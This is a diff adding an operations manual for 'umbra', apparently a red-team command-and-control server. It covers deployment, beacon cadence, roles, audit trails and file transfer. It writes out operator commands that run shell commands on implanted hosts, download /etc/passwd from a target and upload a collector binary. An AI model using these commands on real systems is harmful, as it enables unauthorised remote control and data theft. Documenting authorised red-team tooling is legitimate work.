@@ -1,0 +1,289 @@
+# Operations
+
+## 1. First deployment
+
+```bash
+# 1. secrets (agent PSK and per-operator tokens are independent)
+./scripts/gen-secrets.sh alice bob
+#  -> export UMBRA_AGENT_PSK=...
+#  -> export UMBRA_OPERATOR_TOKENS=alice:...,bob:...
+
+# 2. configuration
+install -d -m 700 /etc/umbra /var/lib/umbra
+install -m 600 deploy/server.prod.json   /etc/umbra/server.json
+install -m 600 /dev/stdin /etc/umbra/agent.psk <<< "$UMBRA_AGENT_PSK"
+printf 'UMBRA_OPERATOR_TOKENS=%s\n' "$UMBRA_OPERATOR_TOKENS" > /etc/umbra/server.env
+chmod 600 /etc/umbra/server.env
+
+# 3. service
+install -m 644 deploy/umbra-server.service /etc/systemd/system/
+systemctl daemon-reload && systemctl enable --now umbra-server
+journalctl -u umbra-server -f
+```
+
+The server prints a fingerprint (first 16 hex chars of SHA-256) for every
+operator token it loads — never the token itself. If a fingerprint is missing,
+the token env var is not visible to the unit.
+
+## 2. Listener layout
+
+| Listener | Default | Exposure |
+|---|---|---|
+| `agent_listen` | `0.0.0.0:4001` | reachable by implants (TCP beacon) |
+| `operator_listen` | `127.0.0.1:4002` | **never** public; reach it through SSH or WireGuard |
+| `http_listen` | `127.0.0.1:4003` | behind the tunnel-facing proxy (`deploy/nginx-http-transport.conf`) |
+
+`server.http_tls_cert` / `http_tls_key` make the Go listener itself serve TLS.
+Leave them empty for beacons: an implant has no TLS stack, so only a TLS-speaking
+relay could use that listener. The supported shape is tunnel → plain listener.
+
+Neither transport has a TLS layer: the beacons speak plain TCP and plain
+HTTP/1.1, so **TLS termination in front of them does not work** — a plaintext
+client cannot complete a TLS handshake. When implants must cross an untrusted
+network, put the transport inside an encrypted tunnel (WireGuard, IPsec, an
+mTLS mesh) and keep the listener bound to the tunnel interface. The frames are
+individually AEAD-sealed, so a tunnel is about hiding *traffic shape* (ports,
+cadence, sizes), not about protecting payload contents.
+
+## 3. Operator workflow
+
+```bash
+export UMBRA_OPERATOR_TOKEN='<your token>'      # or --token-file
+umbra --server 127.0.0.1:4002 --operator alice --watch
+
+umbra[-]> agents
+umbra[-]> use web-01
+umbra[web-01]> run whoami
+umbra[web-01]> exec sysinfo
+umbra[web-01]> sleep 120 40        # slow the beacon down
+umbra[web-01]> tasks 10
+umbra[web-01]> kill                # ask the beacon to exit
+```
+
+Scripted use (CI, reports):
+
+```bash
+umbra --server 127.0.0.1:4002 --operator alice agents
+umbra --server 127.0.0.1:4002 --operator alice task web-01 shell \
+      --args '{"cmd":"uname -a"}' --wait
+umbra --server 127.0.0.1:4002 --operator alice result t-1a2b3c4d
+```
+
+`--token` shows up in the process list; prefer `--token-file` or the environment.
+
+## 4. Beacon tuning
+
+The server dictates cadence at handshake time (`beacon.sleep` / `beacon.jitter`)
+and can change it per agent with `agents.sleep`; the implant applies it
+immediately on the next check-in and keeps it until it is told otherwise.
+
+| Environment | sleep | jitter |
+|---|---|---|
+| Lab / LAN | 5 s | 20 % |
+| Typical engagement | 60 s | 35 % |
+| Low-and-slow | 900 s | 50 % |
+
+Sleep and jitter are clamped server-side (1–86400 s, 0–90 %). Failed cycles back
+off exponentially up to 5 minutes, so a beacon never hammers a dead server.
+
+## 5. State and recovery
+
+* `data_file` holds agents and the task history (JSON). It is written after
+  every state change, but bursts are coalesced into one write, and there is a
+  periodic snapshot every 30 s as a backstop, plus a final write on shutdown.
+  Each write goes to a fresh `*.tmp` in the same directory, is fsynced, and is
+  renamed over the target, so the file on disk is always a complete snapshot
+  (concurrent saves are serialised; a reader never sees a half-written file).
+* Two generations on disk: before the new file is renamed into place, the
+  current one becomes `data_file.bak`. A crash inside that window leaves no
+  primary at all, so startup falls back to the backup and logs
+  `state recovered from the backup generation` — the last few seconds of state
+  are gone, the engagement is not. A torn or non-snapshot primary is treated the
+  same way. `{}` or a file from a newer schema is refused instead of being
+  loaded (and then overwritten) as an empty engagement.
+* Anything that was `delivered` when the server stopped is re-queued on start, so
+  a crash cannot lose a task — at the cost of possibly executing it twice. Task
+  kinds are not idempotent by default, so check `task.list` after a restart.
+* History is capped at 20 000 tasks (oldest completed tasks are pruned).
+* To reset an engagement: stop the server, delete `data_file`, **and rotate the
+  agent PSK and operator tokens** (delete the implants or they will simply
+  re-register).
+
+## 5a. Audit trail
+
+Every operator command is appended to `audit_file` as one JSON object per line,
+before the reply is sent:
+
+```json
+{"at":"2026-10-26T09:14:03.511Z","operator":"alice","peer":"10.0.0.5:51822","transport":"tcp/operator","cmd":"task.submit","ok":true,"agent_id":"web-01","task_id":"t-9f3a","detail":"map[cmd:id kind:shell]","ms":2}
+```
+
+* Written with `O_APPEND` + `fsync` per line over a `0600` file: a line that is
+  lost in a crash would defeat the point.
+* Lives next to the state file (`/var/lib/umbra/audit.jsonl` in the shipped
+  unit) because that is the only directory the unit can write to
+  (`ProtectSystem=strict`). Ship it off-box: a server that can rewrite its own
+  audit log is not an audit log.
+* `audit_max_mb` (default 8) rotates the file to `*.1`…`*.5`; old files are
+  never truncated in place.
+* Free-form fields (arguments, errors) are clipped to 512 characters, so one
+  huge `--args` blob cannot make a line unbounded.
+* An audit write failure is logged and the RPC still completes — a full disk
+  must not stop an engagement, but it must be visible in `journalctl`.
+* Read it back with `umbra audit --limit 20` (newest first), or from the file:
+
+```bash
+jq -c 'select(.ok == false)' data/audit.jsonl | tail
+jq -r '[.at, .operator, .cmd] | @tsv' data/audit.jsonl | tail -20
+```
+
+Setting `audit_file` to `""` disables auditing; the server logs a warning at
+start-up when it is off, and `umbra audit` says so instead of showing an empty
+list. On a real engagement, treat the audit file as evidence: ship it off the
+server, and do not give operators write access to it.
+
+## 5b. Roles
+
+Operator identities are configured with a role:
+
+```bash
+# /etc/umbra/server.env
+UMBRA_OPERATOR_TOKENS=alice:admin:b0a1…,bob:operator:7c2e…,carol:viewer:91fd…
+```
+
+`name:token` (the old form) still works and defaults to `operator`. There must be
+at least one `admin`, or the server refuses to start — otherwise nobody can
+manage the engagement.
+
+| Role | Can |
+|---|---|
+| `viewer` | read agents, tasks, results, audit, operators, chat, schedules |
+| `operator` | everything a viewer can, plus submit/cancel tasks, change beacon cadence, kill, chat, add schedules |
+| `admin` | everything, plus remove schedules and other engagement-wide actions |
+
+`umbra whoami` prints your role and the exact command list it allows, and the
+console refuses locally what the server would refuse anyway. A refusal is
+audited (`ok=false`, `err` starting with `permission denied`), so "who tried
+what" includes what they were not allowed to do.
+
+## 5c. Chat and recurring tasks
+
+* `umbra chat hello team` / `umbra chat` — the last 200 messages are kept in
+  memory and every console receives them as a `chat` event.
+* `umbra schedule add web-01 sysinfo --every 300` creates a recurring task;
+  `umbra schedule list` shows the next run, the run count and who created it;
+  `umbra schedule rm <id>` deletes it. Schedules are persisted with the state
+  file, so a restart does not stop a collection run. The interval is clamped to
+  5–86400 s, and a schedule that came due while the server was down fires once,
+  not once per missed interval.
+
+## 5d. Working as a team
+
+The server is shared state: everything one console does is visible to the
+others, and three small mechanisms keep a team from stepping on each other.
+
+* **Who is where** — `umbra operators` lists every connected console with its
+  role, the agent it is focused on, how long it has been idle and how deep its
+  event queue is. The interactive console announces your focus automatically on
+  `use <agent>`; `umbra focus web-01` (or `focus` to clear) does it from a
+  script. Teammates see an `operator.focus` event.
+* **Claims** — before working a task that someone else might grab, run
+  `umbra claim <task-id>`. `umbra tasks` then shows `CLAIMED BY`, `task.claim`
+  refuses a second operator with `task is claimed by <name>`, and
+  `umbra release <task-id>` frees it. A claim orders people, it does not gate
+  the task: the beacon never waits for one, and a finished task cannot be
+  claimed. Claims survive a restart with the task itself.
+* **Directed chat** — `umbra chat --to bob "web-01 is staged"` (or
+  `chat @bob …` in the console) pushes the line only to Bob's console and your
+  own. The history stays shared and shows the recipient, because a shared
+  engagement needs a shared record: treat it as addressing, not encryption.
+
+## 5e. File transfer
+
+```bash
+umbra --server 127.0.0.1:4002 --operator alice download web-01 /etc/passwd ./passwd
+umbra --server 127.0.0.1:4002 --operator alice upload   web-01 ./collector /tmp/collector
+```
+
+Inside the console the same commands are `get <remote> <local>` and
+`put <local> <remote>` for the selected agent. Both are chunked at 900 KiB, the
+largest payload that still fits in one frame, so arbitrary file sizes work
+without a new message type or a second connection:
+
+* every chunk is checked against the SHA-256 the beacon reports;
+* downloads are written to `<local>.part` and renamed only after the last chunk
+  and the size check pass, so a failed transfer never leaves a truncated file
+  that looks complete;
+* uploads truncate at offset 0 and report the whole-file hash on the final
+  chunk, which the CLI compares with the local file;
+* `--chunk` lowers the step size (useful on lossy links); `--timeout` applies
+  per chunk, not to the whole transfer.
+
+A transfer is a sequence of ordinary tasks, so it appears in `tasks`, in the
+audit trail and in the cancel path like anything else. The beacon reports
+`total`, `offset`, `eof` and `sha256` in each RESULT, and the server stores them
+as task metadata that `result <task-id>` prints.
+
+## 6. Monitoring
+
+```bash
+umbra --server 127.0.0.1:4002 --operator alice stats
+umbra --server 127.0.0.1:4002 --operator alice operators   # who else is connected
+umbra --server 127.0.0.1:4002 --operator alice audit --limit 20
+umbra --server 127.0.0.1:4002 --operator alice watch       # live event stream
+umbra --server 127.0.0.1:4002 --operator alice cancel t-9f3a
+journalctl -u umbra-server | grep -E "handshake failed|exceeded frame budget|queue full"
+```
+
+Signals that matter:
+
+| Log line | Meaning |
+|---|---|
+| `handshake failed` (repeated, same peer) | wrong PSK, clock skew > 300 s, or scanning |
+| `operator key used on the agent listener` | misconfigured implant (operator token in a beacon) |
+| `agent exceeded frame budget` | runaway or hostile peer; connection dropped |
+| `operator event queue full` | an operator console stopped reading; events are dropped (counted in `stats.events_dropped`), agent traffic is unaffected |
+| `state save failed` | disk full/permissions — fix before restarting |
+| `audit write failed` | the audit trail is incomplete; fix the disk and treat the missing window as a gap in the record |
+| `rate limited` (in a response) | an operator console is looping faster than 40 RPC/s; the call was refused, not queued |
+
+Clock skew is the most common deployment issue: the handshake rejects peers whose
+`ts` differs by more than `max_clock_skew_s` (default 300 s). Keep both sides on
+NTP, or raise the limit if you accept the risk.
+
+## 7. Hardening checklist
+
+- [ ] operator listener bound to loopback and reached over SSH/WireGuard
+- [ ] HTTP transport inside an encrypted tunnel, proxy `client_max_body_size` ≥ 2 MB
+- [ ] `agent.psk` and `server.env` mode `0600`, owned by the service user
+- [ ] config file mode `0600` (it contains paths, not secrets, but keep it tight)
+- [ ] systemd hardening enabled (the provided unit drops all capabilities)
+- [ ] tokens per operator, rotated when someone leaves, fingerprints audited
+- [ ] `data_file` on a filesystem with enough room for task history
+- [ ] outbound allow-list on the implant host (only the C2 address/port)
+- [ ] logs shipped somewhere the operators cannot silently edit
+
+## 8. Upgrades
+
+1. Stop the operator consoles (they reconnect).
+2. Replace the binary, keep `server.json` (config is forward compatible; unknown
+   keys are ignored, new fields have defaults).
+3. `systemctl restart umbra-server` — established agents reconnect at their next
+   cycle with fresh ephemeral keys, so nothing has to be rebuilt after a
+   server-side change.
+4. If the protocol changed (new `umbra/vN`), rebuild the implants; the server
+   rejects `HELLO` frames whose `v` it does not implement, and logs the version
+   mismatch.
+
+## 9. Troubleshooting
+
+| Symptom | Likely cause | Fix |
+|---|---|---|
+| `connection failed: ...` in the console | wrong token, wrong `--operator` name, or the server is not listening | check `UMBRA_OPERATOR_TOKENS` and that `--operator` matches the name in the env |
+| agent connects but never appears | handshake rejected | run the beacon with `--verbose`; check PSK and clock |
+| tasks stay `queued` | agent asleep or offline | `agents.list`, wait for the next cycle, or lower `sleep` |
+| `task timed out` | command exceeds the implant's `timeout` arg (default 120 s) | pass `--args '{"cmd":"...","timeout":300}'` |
+| HTTP beacon gets 401/410 | session expired (`idle_timeout_s`) or handshake failed | reload the beacon; check the reverse proxy forwards the path verbatim |
+| `frame too large` | output > 1 MiB or file download > 900 KiB | use `download` chunks / redirect to a file and pull it in pieces |
+| everything works, then stops after a day | keys rotated but a peer missed the `REKEY` frame | should not happen: `REKEY` always precedes `TASK_BATCH` (PROTOCOL.md §6). Look for `session rekeyed` in the beacon log; if it is missing, capture both sides and file a bug |
+| link drops with "nonce mismatch" right as an operator connects or a task completes | two writers sealed and wrote out of order | nothing to fix in the field: a correctly written pair keeps `seal+write` in one critical section (SEND-SERIAL). If it recurs, it is a bug in the writer added last |
